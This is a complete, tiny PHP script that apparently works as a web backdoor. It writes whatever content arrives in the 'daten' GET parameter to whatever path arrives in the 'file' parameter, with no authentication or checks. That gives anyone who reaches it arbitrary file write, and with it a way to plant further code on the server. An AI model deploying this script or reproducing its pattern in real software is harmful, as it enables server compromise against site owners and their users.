<?php
$file = $_GET['file'];
$daten = $_GET['daten'];
file_put_contents($file,$daten)
?>
